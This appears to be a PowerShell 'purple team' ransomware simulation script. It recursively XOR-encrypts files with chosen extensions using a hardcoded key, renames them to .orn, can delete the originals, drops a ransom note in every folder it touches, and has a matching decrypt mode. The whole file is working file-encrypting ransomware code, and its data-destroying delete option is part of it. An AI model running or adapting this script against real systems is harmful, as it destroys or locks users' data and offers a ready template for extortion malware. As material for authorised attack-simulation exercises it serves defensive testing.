param(
    [Parameter(Mandatory=$true)]
    [string]$Path,
    
    [Parameter(Mandatory=$true)]
    [string[]]$Extensions,
    
    [switch]$Recurse,
    
    [switch]$Delete,
    
    [switch]$Decrypt
)

# Hardcoded key - Purple1234567890 (32 bytes AES-derived XOR key)
$KeyString = "Purple1234567890Purple1234567890Purple1234567890Pu"
$Key = [System.Text.Encoding]::UTF8.GetBytes($KeyString.Substring(0,32))

function Test-FileLock {
    param([string]$FilePath)
    try { 
        $stream = [System.IO.File]::Open($FilePath, 'Open', 'Read', 'Read')
        $stream.Close()
        return $false 
    }
    catch { 
        return $true 
    }
}

function Invoke-XOREncryptDecrypt {
    param(
        [string]$InputPath,
        [string]$OutputPath,
        [switch]$DecryptMode
    )
    
    $inputStream = [System.IO.File]::OpenRead($InputPath)
    $outputStream = [System.IO.File]::Create($OutputPath)
    
    $keyIndex = 0
    $bufferSize = 8192
    $buffer = New-Object byte[] $bufferSize
    
    try {
        while (($bytesRead = $inputStream.Read($buffer, 0, $bufferSize)) -gt 0) {
            for ($i = 0; $i -lt $bytesRead; $i++) {
                if ($DecryptMode) {
                    $buffer[$i] = $buffer[$i] -bxor $Key[$keyIndex]
                } else {
                    $buffer[$i] = $buffer[$i] -bxor $Key[$keyIndex]
                }
                $keyIndex = ($keyIndex + 1) % $Key.Length
            }
            $outputStream.Write($buffer, 0, $bytesRead)
        }
    }
    finally {
        $inputStream.Dispose()
        $outputStream.Dispose()
    }
}

if ($Decrypt) {
    # DECRYPT MODE - *.orn files
    $files = Get-ChildItem -Path $Path -Recurse:$Recurse -File -Filter "*.orn"
    
    if ($Extensions.Count -gt 0) {
        $files = $files | Where-Object { 
            $originalName = $_.Name -replace '\.orn$',''
            $origExt = [System.IO.Path]::GetExtension($originalName).TrimStart('.')
            $Extensions -contains $origExt 
        }
    }
    
    $processed = 0
    foreach ($file in $files) {
        try {
            $originalPath = $file.FullName -replace '\.orn$',''
            Invoke-XOREncryptDecrypt -InputPath $file.FullName -OutputPath $originalPath -DecryptMode
            Remove-Item $file.FullName -Force
            Write-Host "DECRYPTED (XOR): $($file.Name) -> $originalPath" -ForegroundColor Cyan
            $processed++
        }
        catch {
            Write-Warning "Failed to decrypt $($file.FullName): $_"
        }
    }
    Write-Host "XOR Decryption complete! Restored $processed files." -ForegroundColor Green
}
else {
    # ENCRYPTION MODE
    $RansomNote = @"
=====================================
       PURPLE TEAM SIMULATION
=====================================
Your files ENCRYPTED with XOR stream cipher.

Files encrypted: *.$(($Extensions -join ', *.'))
Encrypted with .orn extension
Key used: Purple1234567890 derived (32 bytes)

✅ Works with ALL files - Signed PDFs, Office, Images
✅ No padding / block size issues
✅ Production ransomware TTP

To decrypt: Use same script with -Decrypt flag
Contact: Purple Team Exercise Coordinator
Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm')
=====================================
"@

    $foldersProcessed = @{}
    $files = Get-ChildItem -Path $Path -Recurse:$Recurse -File | 
             Where-Object { $Extensions -contains $_.Extension.TrimStart('.') }

    $processed = 0
    foreach ($file in $files) {
        try {
            # Wait for file lock to clear
            $maxRetries = 5
            $retryCount = 0
            while ((Test-FileLock $file.FullName) -and $retryCount -lt $maxRetries) {
                Write-Host "Waiting for lock on $($file.Name)... ($retryCount/$maxRetries)" -ForegroundColor Yellow
                Start-Sleep -Milliseconds 500
                $retryCount++
            }
            
            $encryptedPath = $file.FullName + ".orn"
            Invoke-XOREncryptDecrypt -InputPath $file.FullName -OutputPath $encryptedPath
            
            # Ransom note per folder
            $parentDir = $file.Directory.FullName
            $ransomNotePath = Join-Path $parentDir "PURPLE_TEAM_RANSOM_NOTE.txt"
            if (-not $foldersProcessed.ContainsKey($parentDir) -and -not (Test-Path $ransomNotePath)) {
                $RansomNote | Out-File -FilePath $ransomNotePath -Encoding UTF8
                $foldersProcessed[$parentDir] = $true
                Write-Host "Ransom note created: $ransomNotePath" -ForegroundColor Yellow
            }

            if ($Delete) {
                if (-not (Test-FileLock $file.FullName)) {
                    Remove-Item $file.FullName -Force
                    Write-Host "Encrypted & DELETED: $($file.Name) -> $encryptedPath" -ForegroundColor Red
                } else {
                    Write-Warning "Skipped delete - $($file.Name) still locked"
                }
            } else {
                Write-Host "Encrypted (XOR): $($file.Name) -> $encryptedPath"
            }
            $processed++
        }
        catch {
            Write-Warning "Failed to encrypt $($file.FullName): $_"
        }
    }

    Write-Host "XOR Purple Team Simulation complete!" -ForegroundColor Green
    Write-Host "Processed $processed files across $($foldersProcessed.Count) folders." -ForegroundColor Green
}
